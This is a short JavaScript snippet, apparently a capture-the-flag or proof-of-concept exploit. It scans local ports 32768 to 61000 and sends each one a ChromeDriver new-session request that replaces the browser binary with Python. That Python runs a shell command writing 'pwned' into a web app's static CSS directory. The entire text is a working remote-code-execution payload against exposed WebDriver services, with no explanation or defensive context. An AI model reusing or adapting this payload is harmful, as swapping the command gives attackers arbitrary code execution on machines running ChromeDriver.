let options = {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
        capabilities: {
        alwaysMatch: {
            browserName: "chrome",
            "goog:chromeOptions": {
            binary: "/usr/bin/python",
            args: ["-c", "__import__('os').system('echo pwned > /app/application/static/css/pwn.css')"]
            },
        },
        },
    }),
    };
for (let port = 32768; port < 61000; port++) {
fetch(`http://0.0.0.0:${port}/session`, options);
}